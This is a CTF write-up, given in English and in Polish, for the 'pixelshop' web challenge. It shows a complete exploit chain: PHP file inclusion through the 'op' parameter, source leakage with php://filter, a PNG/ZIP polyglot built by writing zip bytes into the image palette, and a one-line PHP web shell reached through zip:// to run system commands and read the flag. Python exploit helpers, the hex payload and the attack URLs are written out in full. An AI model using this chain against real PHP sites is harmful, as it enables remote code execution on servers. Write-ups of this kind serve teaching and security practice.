## pixelshop (web, 300 points, 15 solves)

	everyone loves pixel art, and thanks to pixelshop you can now create pixel art from your browser! exciting!

###eng
[pl](#pl-version)

we get access to a webpage where we can upload icons (max 32x32) or even draw an icon with built-in editor.
those icons are then placed in /uploads directory with random name as png files.
first thing we notice is the navigation on the page handled by a get parameter `op`, eg `http://pixelshop.pwning.xxx/?op=upload`
we try to put some other values there and we determine that it's a file inclusion for `.php` files.
we use php filter-wrapper `php://filter/read=convert.base64-encode/resource=` to force base64 encoding of the included pages eg:

`http://pixelshop.pwning.xxx/?op=php://filter/read=convert.base64-encode/resource=index`

this way we extract all source files (see [src](src) directory).
sources analysis brings us to conclusion that:

- the page only includes `.php` files because the extension is always added, and it's a new php so no null-byte poisoning
- any uploaded image will always have `.png` extension
- we can only upload a proper image to the webpage
- the image is stripped from metadata so no way to smuggle something in exif
- we can manually set palette and image pixels using the built-in image edit feature of the webpage.

the first issue we had to overcome was the ability to include a file of our choosing.
it took us a while to figure out the approach but then we come up with an idea that if wrappers helped us once, they might help again.
there is a `zip://` wrapper which enables unzipping archives on the fly and provides access to the stored files.
this means that it's possible to run: `zip://path_to_zip#file_name` as `include()` argument and this way you can include the file from zip.
this means that if we could upload a zip archive with a php file inside to the webpage, we could then include it via:

`http://pixelshop.pwning.xxx/?op=zip://uploads/our_zip%23file_inside`

and this would unpack the archive and include `file_inside.php` file to the page.
this fixes the problem with file extension since we can control extension of the file inside zip.
but there is still problem with how to upload a zip file when we can only upload a valid image file.
it turns out a proper png file can be also a proper zip file!
and the `zip://` does not take extension into consideration so it can unzip a `.png` file just as well, as long as it's a zip file.

we couldn't simply upload our rigged png file since it would be processed by the page, but we could edit it afterwards.
the edit feature provides api to set palette and pixels using json. 
palette is very interesting because it is stored in consecutive bytes inside the png file.
palette needs to come as triplets (for rgb) so we prepare a function to convert given binary payload into palette bytes string:

```python
def form_payload(payload):
    b = ["{:02x}".format(ord(c)) for c in binascii.unhexlify(payload)]
    for i in range(3-(len(b) % 3)): # padding
        b.append("00")
    data = []
    for i in range(0, len(b), 3):
        data.append('"#%s%s%s"' % (b[i], b[i + 1], b[i + 2]))
    return ",".join(data)
```

and we prepare a script to edit selected uploaded png file on the webpage and to set our payload as palette bytes:

```python
def edit_file(imagekey, palette_payload):
    base_url = "http://pixelshop.pwning.xxx/"
    url = base_url + "?op=save"
    img = ",".join(['0' for i in range(32 * 32)])
    payload = form_payload(palette_payload)
    jsondata = """
     {
       "pal": [%s],
       "im":[%s]
     }
    """ % (payload, img)
    data = {"imagekey": imagekey, "savedata": jsondata}
    result = requests.post(url, data=data)
    print(result.content)
    image_url = base_url + "uploads/" + imagekey + ".png"
    png = requests.get(image_url)
    print(" ".join("{:02x}".format(ord(c)) for c in png.content))
```

now we need to somehow make this png a proper zip file.
the interesting thing about zip files is that, unlike most file formats, the header of the file is somewhere at the end.
so the unzip is looking from the end of the file for the main header.
we can also mark anything after this header as "comment" and then unzip will ignore it.
additionally the zip header specifies offsets (from the file start) at which the compressed data are stored.
since we know the "prefix" of the png file we can simply calculate the zip offsets by hand to start in the injected palette.

we execute the code with our crafted zip payload:

`payload_raw = "504b0304140000000800ee769148f0d042901d0000002100000005000000732e706870b3b12fc82850508977770d89564f548fd5803293d46335adeded78b900504b01021400140000000800ee769148f0d042901d00000021000000050000000000000001002000000029000000732e706870504b0506000000000100010033000000690000000000"`

and we get an image file uploaded on the server:


[image extracted text: ]
 

which can be also unzipped, and inside stores `s.php` file with a simple php shell inside

```php
<?php $_get['a']($_get['b']); ?>
```

with this file safely uploaded in the server as `847cf5ebb78615e61ab646189e3ffbff138801ad.png` we can finally run:

`http://pixelshop.pwning.xxx/?a=system&b=ls /&op=zip://uploads/847cf5ebb78615e61ab646189e3ffbff138801ad.png%23s`

which runs `system('ls /')`.


[image extracted text: pixelshor
owninc cx
'?azsystem&bzis
&opzzip:/ {upload5/847cf5ebb78615e61ab646189e3ffbff138801
pix
flag_key_pctf_flag_goes_here_open_me_guys_seriously
run sbin stv sys emp ust var vilinuz]



[image extracted text: pixelshop pwning xxx/ ?azsystem&bzcat /flag_key_pctf_flag_goes_here_open_me_guys_seriou
pixe
pctf{pixbls_ar3_nlc3_but_sh311_15_sw3bter_b271ea7f}]


and we finally get the flag:

`pctf{p1x3ls_ar3_nic3_but_sh311_15_sw33ter_b271ea7f} `

###pl version

dostajemy dostęp do strony pozwalającej na uploadowanie ikonek (max 32x32) oraz na rysowanie/edytowanie ikonek przez wbudowany edytor.
ikonki są następnie zapisywane w katalogu /uploads z losową nazwą jako pliki png.
pierwsza rzecz którą zauważyliśmy to fakt, że nawigacja strony odbywa się za pomocą parametru get `op`, np. `http://pixelshop.pwning.xxx/?op=upload`
próba umieszczania tam różnych wartości pozwala stwierdzić że ten parametr jest używany jako argument dla include plików `.php`
wykorzystaliśmy więc filtr-wrapper php `php://filter/read=convert.base64-encode/resource=` żeby wymusić konwersje pliku do base64 przed includowaniem:

`http://pixelshop.pwning.xxx/?op=php://filter/read=convert.base64-encode/resource=index`

we ten sposób uzyskujemy źródła wszystkich plików (patrz katalog [src](src)).
analiza źródeł pozwala stwierdzić że:

- strona includuje tylko pliki `.php` ponieważ rozszerzenie jest zawsze doklejane, a jest to nowa wersja php niepodatna na null-byte poisoning
- każdy uploadowany plik będzie miał rozszerzenie `.png`
- możemy uploadować tylko poprawne obrazki
- obrazek jest czyszczony z metadanych więc nie ma możliwości przmycić czegoś w exif
- możemy ręcznie ustawić palete oraz piksele obrazu przez wbudowaną w stronę funkcje edycji ikonek

pierwszy problem który musieliśmy pokonać to includowanie wybranego przez nas pliku.
chwile zajęło nam dojście do rozwiązania, ale wreszcie pomyśleliśmy że skoro wrappery pomogły raz to mogą i drugi.
php udostępnia wrapper `zip://` który pozwala w locie odpakować archiwum i uzyskać dostęp do jego zawartości.
to oznacza że można wykonać `zip://path_to_zip#file_name` jako parametr `include()` i tym samym includować plik z wnętrza zipa.
to oznacza że gdybyśmy mogli uploadować archiwum zip z plikiem php w środku, to moglibyśmy includować ten plik przez:

`http://pixelshop.pwning.xxx/?op=zip://uploads/our_zip%23file_inside`

i to pozwoliłoby odpakować archiwum i includować plik `file_inside.php` na stronę.
to rozwiązuje problem z rozszerzeniem pliku, ponieważ kontroluejmy rozszerzenie pliku wewnąrz zipa.
nadal pozostaje jednak problem uploadowania archiwum zip podczas gdy strona pozwala umieszczać tylko poprawne obrazki.
okazuje się jednak że poprawny plik png może jednocześnie być poprawnym archiwum zip!
a wrapper `zip://` nie bierze pod uwagę rozszerzenia piku więc może odpakować plik `.png` o ile jest to poprawne archiwum.

nie mogliśmy po prostu uploadować przygotowanego pliku png ponieważ zostałby przez stronę przetworzony, ale mogliśmy do edytować.
funkcja edycji udostępniała api do ustawiania palety oraz pixeli przez jsona.
paleta jest wyjątkowo interesująca bo jest składowana jako kolejne bajty w pliku png.
paleta była przyjmowana jako trójki (rgb) więc przygotowaliśmy funkcje konwertujacą podany payload na palete:

```python
def form_payload(payload):
    b = ["{:02x}".format(ord(c)) for c in binascii.unhexlify(payload)]
    for i in range(3-(len(b) % 3)): # padding
        b.append("00")
    data = []
    for i in range(0, len(b), 3):
        data.append('"#%s%s%s"' % (b[i], b[i + 1], b[i + 2]))
    return ",".join(data)
```

a następnie przygotowaliśmy skrypt edytowal plik png na stronie i ustawiał jako palete wybrane przez nas bajty:

```python
def edit_file(imagekey, palette_payload):
    base_url = "http://pixelshop.pwning.xxx/"
    url = base_url + "?op=save"
    img = ",".join(['0' for i in range(32 * 32)])
    payload = form_payload(palette_payload)
    jsondata = """
     {
       "pal": [%s],
       "im":[%s]
     }
    """ % (payload, img)
    data = {"imagekey": imagekey, "savedata": jsondata}
    result = requests.post(url, data=data)
    print(result.content)
    image_url = base_url + "uploads/" + imagekey + ".png"
    png = requests.get(image_url)
    print(" ".join("{:02x}".format(ord(c)) for c in png.content))
```

teraz potrzebujemy sprawić żeby plik png był też plikiem zip.
interesujący fakt na temat plików zip jest taki, że w przeciwieństwie do większości formatów, nagłówek pliku jest gdzieś pod koniec.
więc unzip szuka od końca pliku w poszukiwaniu głównego nagłówka.
dodatkowo możemy oznaczyć wszystko za nagłowkiem jako "komentarz" i unzip to zignoruje.
co więcej nagłówek zip specyfikuje offsetu (od początku pliku) gdzie znajdują się skompresowane dane.
ponieważ znamy "prefix" pliku png możemy ręcznie policzyć offsety w pliku zip tak żeby zaczynały się we wstrzykiwanej palecie kolorów.

wykonujemy skrypt z przygotowanym payloadem zip:

`payload_raw = "504b0304140000000800ee769148f0d042901d0000002100000005000000732e706870b3b12fc82850508977770d89564f548fd5803293d46335adeded78b900504b01021400140000000800ee769148f0d042901d00000021000000050000000000000001002000000029000000732e706870504b0506000000000100010033000000690000000000"`

i dostajemy na serwerze plik:


[image extracted text: ]
 

który może zostać odpakowany a w środku zawiera plik `s.php` z prostym php shellem:

```php
<?php $_get['a']($_get['b']); ?>
```

z tym plikiem bezpiecznie leżącym na serwerze jako `847cf5ebb78615e61ab646189e3ffbff138801ad.png` możemy wreszcie uruchomić:

`http://pixelshop.pwning.xxx/?a=system&b=ls /&op=zip://uploads/847cf5ebb78615e61ab646189e3ffbff138801ad.png%23s`

co daje nam przykładowo `system('ls /')`.


[image extracted text: pixelshor
owninc cx
'?azsystem&bzis
&opzzip:/ {upload5/847cf5ebb78615e61ab646189e3ffbff138801
pix
flag_key_pctf_flag_goes_here_open_me_guys_seriously
run sbin stv sys emp ust var vilinuz]



[image extracted text: pixelshop pwning xxx/ ?azsystem&bzcat /flag_key_pctf_flag_goes_here_open_me_guys_seriou
pixe
pctf{pixbls_ar3_nlc3_but_sh311_15_sw3bter_b271ea7f}]


i finalnie dostajemy flagę:

`pctf{p1x3ls_ar3_nic3_but_sh311_15_sw33ter_b271ea7f} `
